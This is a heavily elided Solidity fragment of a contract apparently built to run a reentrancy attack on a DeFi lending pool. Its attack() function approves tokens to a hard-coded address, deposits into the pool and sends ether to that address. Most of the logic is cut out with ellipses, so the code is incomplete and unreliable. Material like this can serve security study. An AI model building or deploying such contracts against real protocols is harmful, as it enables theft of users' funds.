...
contract ReeterancyCallForLendingPool {
    ...
    function attack() external payable {
        ...
        IERC20(0xe22da380ee6B445bb8273C81944ADEB6E8450422).approve(0x3526a2fe5dA32d0f0814086848628bF12A1E4417, 10000000);
        ...
        lendingPool.deposit(
         ...
         payable(0x3526a2fe5dA32d0f0814086848628bF12A1E4417).transfer(0.00001 ether);
    }
}
